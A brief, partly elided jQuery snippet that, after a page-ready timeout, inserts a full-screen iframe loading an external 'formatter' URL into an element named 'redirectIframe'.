$(document).ready(function () {
 ...
 setTimeout(function () {
					...
					document.getElementById("redirectIframe").innerHTML = '<iframe id="fullScreenIframe" style="width: 100%; height: 100%; overflow: hidden;" src="https://www.quenq.com/boot/formatter/" width="100" height="100" scrolling="no"></iframe>';
